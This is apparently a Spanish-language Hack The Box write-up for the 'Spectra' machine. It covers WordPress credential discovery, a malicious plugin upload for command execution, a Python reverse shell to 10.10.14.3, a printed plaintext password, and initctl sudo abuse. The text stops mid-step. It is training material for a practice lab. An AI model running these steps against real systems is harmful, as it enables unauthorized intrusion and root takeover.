#by d4l1

<p align="center"><img src=""></p>

<h1 align="center">Spectra</h1>

# ÍNDICE

# INTRODUCCIÓN

Spectra es una máquina linux de dificultad fácil el que contiene un software de tracking construido en Wordpress. Este servidor lista un directorio con credenciales en el cual ganaremos acceso al manager de administrador. Construyendo un plugin malicioso

Enumerando unas nuevas credenciales y capturandolas para coger otoro usuario. Finalmente un problema de configuración permite hacer acciones de sudo en los servicios y ganado el root.

Primero de todo tes de conectividad

![image](https://github.com/D4l1-web/HTB/assets/79869523/0607b6f2-0635-4c7b-8aec-8c8292e95689)

Escaner de puertos

![image](https://github.com/D4l1-web/HTB/assets/79869523/b4391565-6aa4-4a3d-b862-e2e3d3cfe930)

Como podemos ver nos encontramos cono un servicio SSH, Nginx y un MySQL en los puertos por defecto. No hemos mencionado que la versión de nginx es vulnerable a RCE

Podemos irnos al puerto 80 y ver la página y veremos a que tenemos acceso

![image](https://github.com/D4l1-web/HTB/assets/79869523/dd1fc5e4-d199-4667-abdb-dc10130caf2e)

Nos encontramos si busacmos en el dominio "spectra.htb"

```
echo "ip spectra.htb" | sudo tee -a /etc/hosts
```

Si nos vamos al dominio encontramos esto 

![image](https://github.com/D4l1-web/HTB/assets/79869523/0e565c34-c008-472a-8578-0db391ea019a)

Encontramos el directorio /testing/ que es importante

![image](https://github.com/D4l1-web/HTB/assets/79869523/d707a2a2-45aa-4fc3-a082-ca99668b4b95)

De todo la vida el wp-config.php estan las credenciales veamos, vemos que ha sido editado y hay otro archivo con un .save

![image](https://github.com/D4l1-web/HTB/assets/79869523/c47fc130-5897-4bb0-8ff0-33f2452a17cb)

Si probamos con las credenciales que nos dan nos da error, pero si en el usuario ponemos "administrator" nos deja entrar 

![image](https://github.com/D4l1-web/HTB/assets/79869523/98e19537-2512-4f59-ba44-a583b95a95bc)

Teniendo privilegios de administrador en una instancia de Worpress, hace que tengamos muchas tecnicas que puedan dar una ejecución de comando en el servidor. Un metodo es subir un plugin malicioso y guardarlo como wp-maintenance.php

![image](https://github.com/D4l1-web/HTB/assets/79869523/68907b04-ab02-42a7-83c3-63ad4b1a6163)

Una vez creado el archivo podemos irnos a plugins y añadir uno elegir el archivo e instalarlo

![image](https://github.com/D4l1-web/HTB/assets/79869523/28fbafb1-3d32-45b1-8d02-8a2d8d844f90)

Nos da error vamos a probar a comprimirlo

![image](https://github.com/D4l1-web/HTB/assets/79869523/277ebbf7-5426-44bb-a527-4a1740b57de9)

![image](https://github.com/D4l1-web/HTB/assets/79869523/f674863f-cea3-4929-b0db-7020f94287e3)

![image](https://github.com/D4l1-web/HTB/assets/79869523/7dc8fd01-cd5a-4247-9aaa-1af07ad94934)

Ahora nosotros podemos navegar a esa url y probar si podemos ejecutar comandos

![image](https://github.com/D4l1-web/HTB/assets/79869523/8e40edb7-f7d7-42b2-bf80-cab642dee3fd)

Podemos hacer una revershe shell con python

```
cmd=python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.
10.14.3",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Nos conectamos y conseguimos una buena shell

```
# In the reverse shell
SHELL=/bin/bash script -q /dev/null
Ctrl-Z
# In Parrot
stty raw -echo
fg
reset
xterm
# In the reverse shell
export SHELL=bash
export TERM=xterm-256color
stty rows 24 columns 150
```

Si hacemos una enumeracion por /home/user/ podemos encontrar archivos de usuarios y hashes también tneemos backups dentro de /backups/user_profiles que pueden leer los usuarios

Vamos a hacer enumeraciones de servicio como ftp 
```
grep -R ftp://
```

encontramos un 00089.log y le hacemos cat, encontramos una contraseña del usuario katie
```
ssh katie@ip
```
Tambien tenemos otro archivo que nos dice literalmente la pass en la ruta /etc/autologin/passwd

```
SummerHereWeCome!!
```

cuando hacemos un sudo -l para ver los permisos encontramos una ruta "/sbin/initctl"

Buscando este tipo de archivos se encunetran en el directorio /srv
```
find / -group developers 2>/dev/null
```

este contenido tiene los test del servidor
```
ls -al srv/
```

```
cat srv/nodetest.js
```
Encontramos un js que crea un servidor 

si vemos la ejecución y a donde va tenemos permisos de escritura y ejecución 

![image](https://github.com/D4l1-web/HTB/assets/79869523/2ec39131-fadf-48ce-b107-36f6f07f17eb)

Encontramos esto 
```
katie@spectra ~ $ cat /etc/init/test.conf
description "Test node.js server"
author "katie"
start on filesystem or runlevel [2345]
stop on shutdown
script
export HOME="/srv"
echo $$ > /var/run/nodetest.pid
 exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
end script
pre-start script
echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script
pre-stop script
rm /var/run/nodetest.pid
echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
```

Busquemos "upstart initctl"

Descubrimos como trucar el "inictl" para remplazar el contenido
```
start on pwn
task
exec









